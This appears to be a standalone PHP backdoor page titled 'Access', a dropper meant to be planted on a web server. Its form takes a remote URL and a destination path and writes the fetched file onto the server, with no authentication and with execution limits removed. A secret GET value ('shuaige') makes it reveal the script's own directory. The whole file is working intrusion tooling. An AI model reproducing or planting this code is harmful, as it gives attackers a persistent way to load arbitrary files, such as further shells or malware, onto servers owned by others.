<?php
set_time_limit(0);
@ini_set('memory_limit', '500M');
@ini_set('max_execution_time',0);

function download($url,$path) {
    set_time_limit (50 * 60);
    $destination_folder = $path;
    $newfname = $destination_folder . basename($url);
    $file = fopen($url, "rb");
    if ($file) {
        $newf = fopen($newfname, "wb");
        if ($newf)
            while (!feof($file)) {
                fwrite($newf, fread($file, 2048 * 8), 2048 * 8);
            }
    }
    if ($file) {
        fclose($file);
    }
    if ($newf) {
        fclose($newf);
        echo "Download Fnise";
    }
    
}
if (isset($_POST['submit1'])) {
    $url = $_POST['url'];
    download($url[0], $url[1]);
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Access</title>
</head>
<body>
	<form method="post" name="form1">
    U:<input name="url[]" size="50"/>
    D:<input name="url[]" value="<?php if($_GET['xy']=='shuaige')echo dirname(__FILE__).'\\' ?>" size="50"/>
    <input name="submit1" type="submit" />
</form>
</body>
</html>